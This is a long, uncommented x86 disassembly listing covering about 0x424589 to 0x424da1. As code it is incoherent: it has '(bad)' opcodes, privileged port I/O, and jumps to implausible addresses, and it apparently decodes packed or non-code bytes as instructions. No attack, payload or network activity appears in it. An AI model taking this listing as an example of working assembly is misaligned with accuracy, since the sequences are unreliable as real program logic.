  424589:	inc    DWORD PTR [edx-0x72c5e442]
  42458f:	lea    eax,[eax-0xf7f7589]
  424595:	mov    dl,BYTE PTR [ebx-0x4]
  424598:	push   ebx
  424599:	sub    dh,BYTE PTR [edx-0x454df37a]
  42459f:	sub    edi,edi
  4245a1:	mov    dl,0x50
  4245a3:	ja     0x42452c
  4245a5:	xor    BYTE PTR [edi-0x76],0x80
  4245a9:	lock mov dl,BYTE PTR [ebx-0x4]
  4245ad:	push   ebx
  4245ae:	sub    dh,BYTE PTR [edx-0x454df37a]
  4245b4:	sub    edi,edi
  4245b6:	mov    dl,0x50
  4245b8:	ja     0x424582
  4245ba:	xor    al,0x8a
  4245bd:	xor    BYTE PTR [edi-0x76],0x53
  4245c1:	push   ecx
  4245c2:	push   ebx
  4245c3:	jl     0x424577
  4245c5:	test   BYTE PTR [ecx],ch
  4245c7:	mov    dl,0xbe
  4245c9:	or     al,0xff
  4245cb:	std    
  4245cc:	xor    BYTE PTR [edi+0x7a],0x63
  4245d0:	std    
  4245d1:	aad    0x6f
  4245d3:	sub    dh,0x1e
  4245d6:	push   eax
  4245d7:	ja     0x424560
  4245d9:	xor    BYTE PTR [edi-0x7c],0x80
  4245dd:	out    dx,al
  4245de:	push   ds
  4245df:	push   eax
  4245e0:	ja     0x4245aa
  4245e2:	xor    BYTE PTR [edi-0x76],0x80
  4245e6:	lock mov dl,BYTE PTR [ebx-0x4]
  4245ea:	push   ebx
  4245eb:	sub    dh,BYTE PTR [edx-0x794dd646]
  4245f1:	or     al,0xff
  4245f3:	mov    dl,0x80
  4245f5:	lock xchg DWORD PTR [ebx-0x4e],esp
  4245f9:	aad    0x55
  4245fb:	xor    BYTE PTR [edi-0x76],0x80
  4245ff:	lock mov dl,BYTE PTR [ebx+0x2a]
  424603:	push   ebx
  424604:	cld    
  424605:	mov    dl,0xba
  424607:	sub    DWORD PTR [edx-0x4d00f37a],esi
  42460d:	xor    al,0x87
  424610:	mov    dl,0xbe
  424612:	sub    esp,DWORD PTR [ebx-0x4e]
  424615:	aad    0x1d
  424617:	xor    al,0x87
  42461a:	xor    BYTE PTR [edi+0x21],0x80
  42461e:	int    0x32
  424620:	cmp    cl,BYTE PTR [ebp+0x705c098d]
  424626:	xchg   esi,eax
  424627:	dec    ebp
  424628:	xlat   BYTE PTR ds:[ebx]
  424629:	stc    
  42462a:	dec    ebp
  42462b:	or     ch,bh
  42462d:	les    ebx,FWORD PTR [edi]
  42462f:	xor    BYTE PTR [edi-0x38],0xec
  424633:	ja     0x424624
  424635:	xor    al,0x21
  424638:	adc    BYTE PTR [eax+0x32],0x3a
  42463c:	lea    ecx,[ebp+0xa0c6aed]
  424642:	dec    ebp
  424643:	xlat   BYTE PTR ds:[ebx]
  424644:	stc    
  424645:	dec    ebp
  424646:	xchg   esi,eax
  424647:	out    dx,eax
  424648:	push   eax
  424649:	ja     0x424613
  42464b:	xor    BYTE PTR [edi-0x76],0x80
  42464f:	lock mov dl,BYTE PTR [ebx-0x4]
  424653:	push   ebx
  424654:	sub    dh,BYTE PTR [edx-0x794dd646]
  42465a:	or     al,0xff
  42465c:	mov    dl,0x80
  42465e:	lock enter 0xb263,0x80
  424663:	ja     0x4245f0
  424665:	xor    al,0x8b
  424668:	xlat   BYTE PTR ds:[ebx]
  424669:	push   cs
  42466a:	push   ebx
  42466b:	cld    
  42466c:	push   ebx
  42466d:	sub    dh,BYTE PTR [edx-0x454df37a]
  424673:	sub    edi,edi
  424675:	mov    dl,0x3a
  424677:	ja     0x4245ff
  424679:	les    ebx,FWORD PTR ds:0xfc532a53
  42467f:	mov    dl,0xba
  424681:	sub    DWORD PTR [edx-0x4d00f37a],esi
  424687:	xor    al,0xc8
  42468a:	or     DWORD PTR [edx],esp
  42468c:	mov    dl,0x80
  42468e:	lock test BYTE PTR [eax-0x12],dl
  424692:	and    BYTE PTR [eax-0xf7f7489],al
  424698:	mov    edx,DWORD PTR [ebx-0x4]
  42469b:	push   ebx
  42469c:	sub    dh,BYTE PTR [edx-0x454df37a]
  4246a2:	sub    edi,edi
  4246a4:	mov    dl,0xec
  4246a6:	add    BYTE PTR [eax-0xf7f7589],0x8a
  4246ad:	push   ebx
  4246ae:	sub    dl,BYTE PTR [ebx-0x4]
  4246b1:	mov    dl,0xba
  4246b3:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4246b9:	xor    al,0x84
  4246bc:	pop    edi
  4246bd:	out    dx,al
  4246be:	and    BYTE PTR [ecx],cl
  4246c0:	dec    edi
  4246c1:	adc    DWORD PTR ds:0x77804d4d,ecx
  4246c7:	xor    al,BYTE PTR [eax-0x4d92cd10]
  4246cd:	xchg   BYTE PTR [ecx],ch
  4246cf:	add    DWORD PTR [ecx],esp
  4246d1:	add    esi,ebp
  4246d3:	lea    ecx,[ebp-0x7f4d0073]
  4246d9:	lock not DWORD PTR [edi-0xa]
  4246dd:	and    al,0x6f
  4246df:	cmp    BYTE PTR [esi+0x4d4d8afe],bh
  4246e5:	xor    BYTE PTR [edi-0x76],0x80
  4246e9:	lock mov dl,BYTE PTR [ebx-0x4]
  4246ed:	push   ebx
  4246ee:	sub    dh,BYTE PTR [edx-0x454df37a]
  4246f4:	sub    edi,edi
  4246f6:	mov    dl,0x5f
  4246f8:	ja     0x424680
  4246fa:	xlat   BYTE PTR ds:[ebx]
  4246fb:	out    dx,eax
  4246fc:	xor    BYTE PTR [edi-0x75],0x80
  424700:	lock mov eax,esp
  424703:	outs   dx,DWORD PTR ds:[esi]
  424704:	xor    BYTE PTR [edi-0x76],0x80
  424708:	lock mov dl,BYTE PTR [ebx+0x2a]
  42470c:	push   ebx
  42470d:	cld    
  42470e:	stos   DWORD PTR es:[edi],eax
  42470f:	mov    dl,0xba
  424711:	sub    DWORD PTR [edx-0x56f37a],esi
  424717:	mov    dl,0xa3
  424719:	jo     0x424716
  42471b:	out    dx,eax
  42471c:	lea    edx,[edi-0x78127880]
  424722:	xor    eax,0xf68a777c
  424727:	and    al,0x6f
  424729:	cmp    BYTE PTR [edi+esi*2-0x7c],bh
  42472d:	cmc    
  42472e:	and    al,0x6f
  424730:	cmp    BYTE PTR [eax+0x77502177],al
  424736:	and    DWORD PTR [ecx+0x77806a80],ebx
  42473c:	mov    al,BYTE PTR [eax+0xde28a97]
  424742:	pusha  
  424743:	and    ah,BYTE PTR [edi+ebp*2]
  424746:	cmp    BYTE PTR [ebx-0x4e],dl
  424749:	test   eax,0xf8b27e53
  42474e:	sub    DWORD PTR [edx-0x400f37a],esi
  424754:	adc    BYTE PTR [edi+0x9f763ef],0xf
  42475b:	loopne 0x424797
  42475d:	lea    ecx,[ebp-0x7f108880]
  424763:	xchg   edi,eax
  424764:	out    dx,eax
  424765:	in     al,dx
  424766:	or     ah,BYTE PTR [ebp-0x65]
  424769:	push   eax
  42476a:	xchg   edi,eax
  42476b:	enter  0x777c,0x8b
  42476f:	icebp  
  424770:	and    al,0x6f
  424772:	cmp    BYTE PTR [eax-0x687f7489],al
  424778:	mov    edx,DWORD PTR [ebx+0x7e]
  42477b:	mov    dl,0xf8
  42477d:	sub    DWORD PTR [ebx-0x4e],edx
  424780:	mov    dl,0x86
  424782:	or     al,0xff
  424784:	sti    
  424785:	adc    BYTE PTR [edi-0x75187f76],0x53
  42478c:	mov    dh,0x53
  42478e:	or     eax,0xb229bcb2
  424793:	pop    es
  424794:	or     al,0xff
  424796:	pushf  
  424797:	and    bh,0xc8
  42479a:	pop    edi
  42479b:	xchg   ebp,eax
  42479c:	jl     0x42477b
  42479e:	or     DWORD PTR [edi],ecx
  4247a0:	mov    bl,0x3a
  4247a2:	lea    ecx,[ebp-0x7f376880]
  4247a8:	ja     0x424799
  4247aa:	in     al,dx
  4247ab:	jmp    0x9780:0x8d8d8d2e
  4247b2:	out    dx,eax
  4247b3:	and    bh,0xc8
  4247b6:	inc    ebx
  4247b7:	fwait
  4247b8:	push   ebp
  4247b9:	and    bh,0x8a
  4247bc:	xchg   ebx,eax
  4247bd:	and    BYTE PTR [edi+0x53cb538a],0x4
  4247c4:	mov    dl,0x61
  4247c6:	or     al,0xb2
  4247c8:	mov    ah,0x29
  4247ca:	inc    DWORD PTR [esi]
  4247cc:	push   eax
  4247cd:	xchg   edi,eax
  4247ce:	and    DWORD PTR [ebx-0x64],0x9
  4247d2:	jns    0x80cfd512
  4247d8:	xchg   edi,eax
  4247d9:	mov    al,BYTE PTR [eax-0x49ac7519]
  4247df:	push   ebx
  4247e0:	or     eax,0xb20c07b2
  4247e5:	mov    esp,0x509cff29
  4247ea:	xchg   edi,eax
  4247eb:	xor    bh,BYTE PTR [edi+esi*2+0x21]
  4247ef:	repz and al,0x6f
  4247f2:	cmp    BYTE PTR [eax-0x187f7569],al
  4247f8:	mov    dl,BYTE PTR [ebx-0x4a]
  4247fb:	push   ebx
  4247fc:	or     eax,0xb20c07b2
  424801:	mov    esp,0xbe9cff29
  424806:	add    eax,0x808d8d8d
  42480b:	xchg   edi,eax
  42480c:	mov    al,BYTE PTR [eax+0xbed8ad7]
  424812:	or     eax,0x2b2b653
  424817:	sub    DWORD PTR [edx+0x7eff0c07],esi
  42481d:	add    ebx,edx
  42481f:	mov    esi,DWORD PTR [esi+0x97e6388]
  424825:	in     eax,dx
  424826:	jmp    0x43cfd5b8
  42482b:	ret    0xe501
  42482e:	or     ch,bh
  424830:	push   eax
  424831:	xlat   BYTE PTR ds:[ebx]
  424832:	stc    
  424833:	or     DWORD PTR [ebx+ebx*1-0x5e],ebx
  424837:	clc    
  424838:	dec    ebp
  424839:	or     DWORD PTR [ebp-0x7868af73],ecx
  42483f:	adc    BYTE PTR [edi-0x7f8e1379],0xd7
  424846:	xchg   esp,ebp
  424848:	xor    DWORD PTR [edx+0x2b22907],0x9c2ff0c
  424852:	pop    esp
  424853:	sbb    esi,DWORD PTR [edx+0xba22107]
  424859:	mul    BYTE PTR [edi+ebp*2]
  42485c:	cmp    BYTE PTR [eax-0x29],dl
  42485f:	xchg   DWORD PTR [eax-0x69],edx
  424862:	xchg   BYTE PTR [eax-0x287f7869],al
  424868:	xchg   DWORD PTR [ebx-0x4a],edx
  42486b:	in     eax,dx
  42486c:	or     ecx,DWORD PTR ds:0xb20c07b2
  424872:	add    ch,BYTE PTR [ecx]
  424874:	(bad)  
  424875:	jle    0x424863
  424877:	xchg   edi,eax
  424878:	out    dx,eax
  424879:	push   eax
  42487a:	xchg   edi,eax
  42487b:	xchg   DWORD PTR [eax-0x287fde69],eax
  424881:	and    DWORD PTR [ebx-0x4a],edx
  424884:	in     eax,dx
  424885:	or     ecx,DWORD PTR ds:0xb22902b2
  42488b:	pop    es
  42488c:	or     al,0xff
  42488e:	jle    0x424810
  424890:	xlat   BYTE PTR ds:[ebx]
  424891:	xchg   BYTE PTR [ebx-0x3e],ah
  424894:	xlat   BYTE PTR ds:[ebx]
  424895:	rol    BYTE PTR [eax-0x287fde69],0x21
  42489c:	push   ebx
  42489d:	mov    dh,0xed
  42489f:	or     ecx,DWORD PTR ds:0xb22902b2
  4248a5:	pop    es
  4248a6:	or     al,0xff
  4248a8:	jle    0x42482a
  4248aa:	xlat   BYTE PTR ds:[ebx]
  4248ab:	xchg   BYTE PTR [ebx-0x3e],ah
  4248ae:	xlat   BYTE PTR ds:[ebx]
  4248af:	out    dx,eax
  4248b0:	adc    BYTE PTR [edi-0x7c287f79],0x3a
  4248b7:	aam    0xed
  4248b9:	jl     0x4248c7
  4248bb:	dec    ebp
  4248bc:	lock stc 
  4248be:	or     DWORD PTR [edi+0x12],ecx
  4248c1:	dec    ebp
  4248c2:	dec    ebp
  4248c3:	dec    ebp
  4248c4:	cmp    ah,BYTE PTR [edi-0x74687fce]
  4248ca:	adc    bh,0x8b
  4248cd:	push   ebx
  4248ce:	mov    dh,0xed
  4248d0:	or     ecx,DWORD PTR ds:0xb22902b2
  4248d6:	pop    es
  4248d7:	or     al,0xff
  4248d9:	jle    0x42485b
  4248db:	xlat   BYTE PTR ds:[ebx]
  4248dc:	xor    al,BYTE PTR [eax-0x2a9c3719]
  4248e2:	pushf  
  4248e3:	in     eax,0xd3
  4248e5:	sub    eax,0x808a9780
  4248ea:	xlat   BYTE PTR ds:[ebx]
  4248eb:	mov    dl,BYTE PTR [ebx-0x4a]
  4248ee:	in     eax,dx
  4248ef:	or     ecx,DWORD PTR ds:0xb20c07b2
  4248f5:	add    ch,BYTE PTR [ecx]
  4248f7:	in     al,dx
  4248f8:	je     0x4248f9
  4248fa:	jle    0x42487c
  4248fc:	popf   
  4248fd:	out    dx,al
  4248fe:	arpl   WORD PTR [ebx],ax
  424900:	or     DWORD PTR [edi-0x12],ecx
  424903:	dec    ebp
  424904:	dec    ebp
  424905:	dec    ebp
  424906:	mov    ds:0x53847780,eax
  42490b:	mov    dl,0x80
  42490d:	lock test ch,ch
  424910:	add    eax,0xa6c4ab0d
  424915:	xor    BYTE PTR [edi-0x76],0x53
  424919:	mov    dl,0x80
  42491b:	lock mov dl,BYTE PTR [ebx+0x51]
  42491f:	mov    dl,0xba
  424921:	sub    DWORD PTR [edx-0x4d00f37a],esi
  424927:	test   eax,0x8deffb70
  42492c:	xchg   edi,eax
  42492d:	add    BYTE PTR [edi-0x7285785e],0x8d
  424934:	lea    edi,[edi+esi*2-0x76]
  424938:	mul    BYTE PTR [edi+ebp*2]
  42493b:	cmp    BYTE PTR [edi+esi*2-0x75],bh
  42493f:	cmc    
  424940:	and    al,0x6f
  424942:	cmp    BYTE PTR [eax-0xf7f7589],al
  424948:	mov    bl,BYTE PTR [ecx-0x5f21d65]
  42494e:	and    ah,BYTE PTR [edi+ebp*2]
  424951:	cmp    BYTE PTR [ebx-0x4],dl
  424954:	mov    dl,0x86
  424956:	or     al,0xae
  424958:	push   ebx
  424959:	(bad)  
  42495a:	mov    dl,0xba
  42495c:	sub    edi,edi
  42495e:	mov    dl,0x50
  424960:	ja     0x4248e6
  424962:	xor    BYTE PTR [edi-0x76],0x80
  424966:	lock mov dl,BYTE PTR [ebx-0x4]
  42496a:	mov    dl,0x86
  42496c:	or     al,0x53
  42496e:	(bad)  
  42496f:	mov    dl,0xba
  424971:	sub    edi,edi
  424973:	mov    dl,0x50
  424975:	ja     0x42496e
  424977:	and    bh,0x25
  42497a:	xor    BYTE PTR [edi-0x79],0x80
  42497e:	lock xchg DWORD PTR [ebx-0x4e],edx
  424982:	push   eax
  424983:	ja     0x42490c
  424985:	mov    ds:0xa3f68777,al
  42498a:	outs   dx,DWORD PTR ds:[esi]
  42498b:	cmp    BYTE PTR [eax-0xf7f3789],al
  424991:	enter  0xb253,0x50
  424995:	ja     0x42495f
  424997:	mov    ds:0xe9f6c877,al
  42499c:	outs   dx,DWORD PTR ds:[esi]
  42499d:	cmp    BYTE PTR [eax-0xf7fcd89],al
  4249a3:	xor    dl,BYTE PTR [ebx-0x4e]
  4249a6:	push   eax
  4249a7:	ja     0x4249db
  4249a9:	mov    ds:0x24fa3277,al
  4249ae:	outs   dx,DWORD PTR ds:[esi]
  4249af:	cmp    BYTE PTR [eax-0xf7f0689],al
  4249b5:	stc    
  4249b6:	push   ebx
  4249b7:	mov    dl,0x50
  4249b9:	ja     0x4249b4
  4249bb:	mov    ds:0x24f6f977,al
  4249c0:	out    dx,al
  4249c1:	cmp    BYTE PTR [edi+esi*2+0x25],bh
  4249c5:	jmp    0x807ad68c
  4249ca:	ja     0x4249bb
  4249cc:	dec    edi
  4249cd:	push   0x9
  4249cf:	movd   mm5,DWORD PTR [edi]
  4249d2:	lea    ecx,[ebp+0x4f217780]
  4249d8:	push   0x9
  4249da:	(bad)  
  4249dc:	das    
  4249dd:	lea    ecx,[ebp+0x4f1d7780]
  4249e3:	push   0x9
  4249e5:	mov    db5,edi
  4249e8:	lea    ecx,[ebp-0x7fda8880]
  4249ee:	ja     0x424a15
  4249f0:	xor    al,0xef
  4249f3:	mov    dl,0x86
  4249f5:	or     al,0x57
  4249f7:	(bad)  
  4249f8:	hlt    
  4249f9:	lea    ecx,[ebp+0x93a5fb9]
  4249ff:	dec    edi
  424a00:	cmp    ch,BYTE PTR [edi]
  424a02:	lea    ecx,[ebp-0x7f758880]
  424a08:	lock mov dl,BYTE PTR [ebx-0x4]
  424a0c:	mov    dl,0x86
  424a0e:	or     al,0x53
  424a10:	(bad)  
  424a11:	mov    dl,0xba
  424a13:	sub    edi,edi
  424a15:	mov    dl,0x50
  424a17:	ja     0x424a10
  424a19:	xor    BYTE PTR [edi-0x76],0x80
  424a1d:	ja     0x4249a9
  424a1f:	xor    BYTE PTR [edi-0x11],0x80
  424a23:	lock out dx,eax
  424a25:	in     al,dx
  424a26:	jge    0x424a8d
  424a28:	adc    BYTE PTR [edx+0x25f0500a],0x4f
  424a2f:	push   0x9
  424a31:	cvtpi2ps xmm5,mm6
  424a34:	lea    ecx,[ebp-0x9858884]
  424a3a:	and    al,0x79
  424a3c:	cmp    BYTE PTR [eax-0x7f6c8589],al
  424a42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a43:	jp     0x424a98
  424a45:	cld    
  424a46:	push   ebx
  424a47:	add    esi,DWORD PTR [edx-0x4b4df37a]
  424a4d:	sub    edi,edi
  424a4f:	adc    BYTE PTR [eax-0x59],0x7a
  424a53:	xor    BYTE PTR [edi-0x76],0x80
  424a57:	ja     0x4249e3
  424a59:	or     dh,0x2e
  424a5c:	cmp    cl,BYTE PTR [ebp-0x7f8e7f73]
  424a62:	stos   BYTE PTR es:[edi],al
  424a63:	gs in  al,dx
  424a65:	jno    0x4249e7
  424a67:	ja     0x4249f3
  424a69:	xor    BYTE PTR [edi-0x76],0x80
  424a6d:	into   
  424a6e:	cmp    cl,BYTE PTR es:[ebp+0x501d808d]
  424a75:	xchg   edi,eax
  424a76:	and    DWORD PTR [ebx-0x5c],esp
  424a79:	xlat   BYTE PTR ds:[ebx]
  424a7a:	imul   eax,DWORD PTR [eax-0x317f3710],0x32
  424a81:	cmp    cl,BYTE PTR [ebp-0x7b68fe73]
  424a87:	stos   BYTE PTR es:[edi],al
  424a88:	adc    BYTE PTR [edi-0x12aeac38],0xc2
  424a8f:	or     eax,0xb20cbeb2
  424a94:	clc    
  424a95:	sub    edi,edi
  424a97:	mov    dh,0x80
  424a99:	lock and DWORD PTR [edx-0x6cf561b3],ebp
  424aa0:	dec    ebp
  424aa1:	or     ah,BYTE PTR ds:0x8021f080
  424aa7:	xchg   edx,eax
  424aa8:	xchg   ebp,eax
  424aa9:	cmp    BYTE PTR [edi+0xa],0x43
  424aad:	std    
  424aae:	xchg   esi,eax
  424aaf:	in     al,dx
  424ab0:	je     0x424abc
  424ab2:	xchg   BYTE PTR [ecx-0x7f727291],ah
  424ab8:	lock and eax,0x3a36ce80
  424abe:	lea    ecx,[ebp-0x61b2e2b0]
  424ac4:	xchg   ebp,eax
  424ac5:	dec    ebp
  424ac6:	xlat   BYTE PTR ds:[ebx]
  424ac7:	out    dx,eax
  424ac8:	xchg   ebx,eax
  424ac9:	xchg   BYTE PTR [edi-0x7f727212],ch
  424acf:	xchg   ebx,eax
  424ad0:	gs in  al,dx
  424ad2:	xchg   esp,eax
  424ad3:	or     DWORD PTR [eax+ebx*8+0x15],ebx
  424ad7:	add    DWORD PTR [ebp+0x71],esi
  424ada:	sbb    eax,0x801d7750
  424adf:	ja     0x424a6b
  424ae1:	xor    al,0x8a
  424ae4:	push   ebx
  424ae5:	cld    
  424ae6:	in     eax,dx
  424ae7:	add    eax,0x29bab20d
  424aec:	mov    dl,0x86
  424aee:	or     al,0xff
  424af0:	mov    dl,0x9
  424af2:	pop    esp
  424af3:	fisubr DWORD PTR [edi+0x50]
  424af6:	xchg   edi,eax
  424af7:	and    eax,0xf09fd63
  424afc:	mov    esp,0x808d8d8d
  424b01:	ja     0x424a8d
  424b03:	xor    al,0x8a
  424b06:	push   ebx
  424b07:	cld    
  424b08:	in     eax,dx
  424b09:	add    eax,0x29bab20d
  424b0e:	mov    dl,0x86
  424b10:	or     al,0xff
  424b12:	mov    dl,0x50
  424b14:	ja     0x424a99
  424b16:	xor    BYTE PTR [edi-0x75],0x80
  424b1a:	lock mov ebp,ebp
  424b1d:	add    eax,0xb2fc530d
  424b22:	mov    edx,0xc86b229
  424b27:	push   DWORD PTR [edx+0x6fda5c09]
  424b2d:	inc    ebx
  424b2e:	std    
  424b2f:	pop    edi
  424b30:	lock or DWORD PTR [ecx],0xffffffce
  424b34:	and    cl,BYTE PTR [ebp-0xf7f7273]
  424b3a:	sbb    eax,0x50efb2ed
  424b3f:	lock sbb eax,0xf080ecc4
  424b45:	sbb    eax,0x805dd880
  424b4a:	push   cs
  424b4b:	push   eax
  424b4c:	ja     0x424ad0
  424b4e:	jge    0x424b9f
  424b50:	not    ebp
  424b52:	xor    BYTE PTR [ebx-0x9],cl
  424b55:	xor    edi,ebx
  424b57:	in     al,dx
  424b58:	ja     0x424adc
  424b5a:	les    ecx,FWORD PTR [eax+eax*4]
  424b5d:	sti    
  424b5e:	or     al,BYTE PTR [eax+0x74ecee92]
  424b64:	or     al,BYTE PTR [esi-0x7272d05d]
  424b6a:	xor    BYTE PTR [edi+0x1d],0x80
  424b6e:	jge    0x424b5f
  424b70:	push   eax
  424b71:	lock add BYTE PTR [eax-0x687f7510],0x8a
  424b79:	push   ebx
  424b7a:	push   ecx
  424b7b:	in     eax,dx
  424b7c:	ret    0xb20d
  424b7f:	mov    esi,0x29f8b20c
  424b84:	(bad)  
  424b85:	(bad)  
  424b86:	pop    edi
  424b87:	lock adc ch,0x1d
  424b8b:	xor    al,0xef
  424b8e:	in     al,dx
  424b8f:	jge    0x424bb2
  424b91:	dec    ebp
  424b92:	xlat   BYTE PTR ds:[ebx]
  424b93:	add    BYTE PTR [eax-0x13691193],0x74
  424b9a:	or     al,BYTE PTR [esi-0x7272137b]
  424ba0:	xor    BYTE PTR [edi+0x1d],0x80
  424ba4:	lock mov eax,DWORD PTR [eax+0x51538b97]
  424bab:	mov    dl,0xbe
  424bad:	or     al,0xed
  424baf:	ret    0xed0d
  424bb2:	push   0x3d
  424bb4:	mov    dl,0xf8
  424bb6:	sub    edi,edi
  424bb8:	(bad)  
  424bb9:	cmp    dh,al
  424bbb:	add    DWORD PTR [eax+0x77502597],0x1d
  424bc2:	xor    BYTE PTR [edi-0x75],0x80
  424bc6:	lock mov ebp,ebp
  424bc9:	add    eax,0xb2fc530d
  424bce:	mov    edx,0xc86b229
  424bd3:	push   DWORD PTR [edx+0x925f080]
  424bd9:	pop    esp
  424bda:	jg     0x424c4b
  424bdc:	inc    ebx
  424bdd:	std    
  424bde:	pop    edi
  424bdf:	lock or DWORD PTR [ecx],0x4c
  424be3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424be4:	dec    ebp
  424be5:	dec    ebp
  424be6:	dec    ebp
  424be7:	or     dh,0x26
  424bea:	cmp    cl,BYTE PTR [ebp-0x28e29c73]
  424bf0:	push   ebx
  424bf1:	xor    al,0x32
  424bf4:	or     dh,0x32
  424bf7:	cmp    cl,BYTE PTR [ebp-0x7b68fe73]
  424bfd:	stos   BYTE PTR es:[edi],al
  424bfe:	adc    BYTE PTR [edi-0x12aeacce],0xc2
  424c05:	or     eax,0xb20cbeb2
  424c0a:	clc    
  424c0b:	sub    edi,edi
  424c0d:	mov    dh,0x80
  424c0f:	lock and DWORD PTR [edx-0x6c6a61b3],ebp
  424c16:	dec    ebp
  424c17:	or     ah,BYTE PTR ds:0xf096a4f
  424c1d:	pushf  
  424c1e:	or     al,0x8d
  424c20:	lea    eax,[eax-0x317fda69]
  424c26:	cmp    BYTE PTR [edx],0x8d
  424c29:	lea    eax,[eax+0x53fd808d]
  424c2f:	push   ecx
  424c30:	in     eax,dx
  424c31:	xor    cl,BYTE PTR ds:0xb20cbeb2
  424c37:	test   BYTE PTR [ecx],ch
  424c39:	(bad)  
  424c3a:	std    
  424c3b:	or     DWORD PTR [edi],ecx
  424c3d:	jb     0x424c79
  424c3f:	lea    ecx,[ebp-0x7f758880]
  424c45:	lock mov dl,BYTE PTR [ebx-0x4]
  424c49:	in     eax,dx
  424c4a:	add    eax,0xc86b20d
  424c4f:	mov    dl,0xba
  424c51:	sub    edi,edi
  424c53:	mov    dl,0x50
  424c55:	ja     0x424bdd
  424c57:	pop    esi
  424c58:	imul   ebp,ecx,0x7d01386f
  424c5e:	test   BYTE PTR [eax-0x10],dl
  424c61:	pop    esi
  424c62:	push   eax
  424c63:	lock data16 jl 0x424cde
  424c67:	inc    esi
  424c68:	sbb    ecx,ebp
  424c6a:	outs   dx,DWORD PTR ds:[esi]
  424c6b:	cmp    BYTE PTR [edi+esi*2+0x62],bh
  424c6f:	call   0x507abc5d
  424c74:	ja     0x424ccc
  424c76:	jl     0x424cef
  424c78:	push   0xfffffff6
  424c7a:	and    al,0x6f
  424c7c:	cmp    BYTE PTR [ebx+0x70],dl
  424c7f:	adc    BYTE PTR [ebp+0x7b24601],0xc
  424c86:	mov    ds:0x8df4c4c2,al
  424c8b:	lea    edi,[ecx+0x75f01650]
  424c91:	dec    ebp
  424c92:	dec    ebp
  424c93:	dec    ebp
  424c94:	xchg   edx,eax
  424c95:	in     eax,dx
  424c96:	retf   
  424c97:	outs   dx,DWORD PTR ds:[esi]
  424c98:	in     al,0xb8
  424c9a:	pusha  
  424c9b:	mov    ecx,0x50386fe9
  424ca0:	dec    edi
  424ca1:	xchg   ebp,eax
  424ca2:	dec    ebp
  424ca3:	dec    ebp
  424ca4:	dec    ebp
  424ca5:	push   eax
  424ca6:	dec    edi
  424ca7:	mov    ebp,0x504d4d4d
  424cac:	ja     0x424d08
  424cae:	push   eax
  424caf:	ja     0x424cc7
  424cb1:	add    DWORD PTR [edx+0xa96018a],edx
  424cb7:	push   eax
  424cb8:	ja     0x424ce8
  424cba:	push   eax
  424cbb:	ja     0x424cf3
  424cbd:	jl     0x424d0e
  424cbf:	or     cl,BYTE PTR [ebp+0x4d]
  424cc2:	dec    ebp
  424cc3:	bnd jmp 0x1928538
  424cc9:	popf   
  424cca:	dec    ebp
  424ccb:	dec    ebp
  424ccc:	dec    ebp
  424ccd:	push   eax
  424cce:	sbb    BYTE PTR [ebp+0x7c4d4d4d],ah
  424cd4:	dec    edi
  424cd5:	lods   eax,DWORD PTR ds:[esi]
  424cd6:	dec    ebp
  424cd7:	dec    ebp
  424cd8:	dec    ebp
  424cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424cda:	jmp    0x4fbe854e
  424cdf:	mov    ch,0x4d
  424ce1:	dec    ebp
  424ce2:	dec    ebp
  424ce3:	sbb    ecx,ebp
  424ce5:	outs   dx,DWORD PTR ds:[esi]
  424ce6:	cmp    BYTE PTR [edi+ecx*2-0x3b],bh
  424cea:	dec    ebp
  424ceb:	dec    ebp
  424cec:	dec    ebp
  424ced:	icebp  
  424cee:	jmp    0x4fbe8562
  424cf3:	push   edx
  424cf4:	dec    ebp
  424cf5:	dec    ebp
  424cf6:	dec    ebp
  424cf7:	sbb    ecx,ebp
  424cf9:	outs   dx,DWORD PTR ds:[esi]
  424cfa:	cmp    BYTE PTR [edi+ecx*2-0x2b],bh
  424cfe:	dec    ebp
  424cff:	dec    ebp
  424d00:	dec    ebp
  424d01:	call   0x507abcef
  424d06:	add    ebp,ebx
  424d08:	dec    ebp
  424d09:	dec    ebp
  424d0a:	dec    ebp
  424d0b:	jl     0x424d5c
  424d0d:	in     eax,0x4d
  424d0f:	dec    ebp
  424d10:	dec    ebp
  424d11:	fucompp 
  424d13:	outs   dx,DWORD PTR ds:[esi]
  424d14:	cmp    BYTE PTR [eax-0x69],dl
  424d17:	int    0x7c
  424d19:	ja     0x424d2a
  424d1b:	nop
  424d1c:	jmp    0xf0928590
  424d21:	adc    BYTE PTR [edi+esi*2+0x41],bh
  424d25:	cmc    
  424d26:	jmp    0xf092859a
  424d2b:	push   ds
  424d2c:	jl     0x424da5
  424d2e:	es (bad) 
  424d30:	jmp    0x77be85a4
  424d35:	mul    BYTE PTR ds:[edi+ebp*2]
  424d39:	cmp    BYTE PTR [ebx+0x6a],dl
  424d3c:	add    BYTE PTR [ecx+0x4f],0xa
  424d40:	dec    ebp
  424d41:	dec    ebp
  424d42:	dec    ebp
  424d43:	mov    dl,0xbe
  424d45:	or     al,0xcd
  424d47:	add    eax,0x2f4110c4
  424d4c:	inc    ebp
  424d4d:	dec    ebp
  424d4e:	dec    ebp
  424d4f:	dec    ebp
  424d50:	ins    DWORD PTR es:[edi],dx
  424d51:	in     eax,dx
  424d52:	mov    ebx,DWORD PTR [ebx]
  424d54:	in     al,0x2
  424d56:	or     dh,0x32
  424d59:	cmp    cl,BYTE PTR [ebp+0x7501018d]
  424d5f:	dec    ebp
  424d60:	dec    ebp
  424d61:	dec    ebp
  424d62:	xchg   esi,eax
  424d63:	dec    ebp
  424d64:	or     ch,dh
  424d66:	sbb    BYTE PTR [edx],0x32
  424d69:	cmp    cl,BYTE PTR [ebp+0x4518018d]
  424d6f:	dec    ebp
  424d70:	dec    ebp
  424d71:	dec    ebp
  424d72:	stos   BYTE PTR es:[edi],al
  424d73:	or     cl,BYTE PTR [ebp-0x6a]
  424d76:	out    dx,eax
  424d77:	push   eax
  424d78:	ja     0x424d77
  424d7a:	add    DWORD PTR [edi-0x7a],esi
  424d7d:	or     al,BYTE PTR [eax-0x72c5d932]
  424d83:	lea    ecx,[ebp-0x7f]
  424d86:	xor    BYTE PTR [edi-0x3],0x4d
  424d8a:	test   DWORD PTR [eax-0xf7f7589],0xedfc538a
  424d94:	add    eax,0xc86b20d
  424d99:	mov    dl,0xba
  424d9b:	sub    edi,edi
  424d9d:	mov    dl,0x50
  424d9f:	ja     0x424d50
  424da1:	xor    al,0x8a
